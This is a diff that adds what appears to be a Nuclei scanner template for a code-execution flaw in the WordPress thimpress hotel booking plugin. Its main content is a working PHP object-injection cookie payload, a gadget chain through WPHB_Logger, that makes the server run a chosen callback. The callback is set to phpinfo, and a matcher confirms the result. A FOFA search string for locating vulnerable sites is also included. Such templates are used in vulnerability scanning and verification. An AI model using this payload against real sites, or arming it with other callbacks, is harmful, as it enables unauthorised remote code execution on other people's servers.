@@ -1,0 +1,28 @@
+id: wordpress-thimpress_hotel_booking-rce
+
+info:
+  name: wordpress-thimpress_hotel_booking-rce
+  author: HackTwo
+  severity: high
+  description: wordpress thimpress_hotel_booking 存在代码执行漏洞。
+  tags: wordpress,rce
+  metadata:
+    fofa-qeury: body="wp-content/plugins/wp-hotel-booking"
+
+http:
+  - raw:
+      - |              
+        GET / HTTP/1.1
+        Host: {{hostname}}
+        Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:7:"{{rce}}"%3B}}}
+        User-Agent: Mozilla/5.0
+
+    payloads:
+      rce:
+        - "phpinfo"
+
+    matchers:     
+      - type: dsl
+        name: rce
+        dsl:
+          - '(status_code==200 && contains(body, "PHP Extension")  && contains(body, "PHP Version") && contains(header, "text/html"))'
